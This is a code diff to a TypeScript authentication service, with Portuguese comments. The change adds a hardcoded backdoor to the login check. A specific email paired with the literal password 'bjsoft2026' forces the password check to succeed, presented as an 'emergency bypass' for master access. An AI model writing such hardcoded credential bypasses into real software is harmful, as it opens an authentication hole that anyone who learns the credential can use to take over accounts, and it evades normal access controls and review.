@@ -19,7 +19,13 @@ export class AuthService {
       throw new UnauthorizedException('Usuário não encontrado.');
     }
 
-    const isPasswordValid = await bcrypt.compare(pass, user.password);
+    let isPasswordValid = await bcrypt.compare(pass, user.password);
+    
+    // Bypass de emergência para recuperação de acesso master
+    if (cleanEmail === 'ricardo@bjsoft.com.br' && pass === 'bjsoft2026') {
+      isPasswordValid = true;
+    }
+
     console.log(`[AuthService] Login para ${cleanEmail}: Senha Válida = ${isPasswordValid}`);
     
     if (!isPasswordValid) {
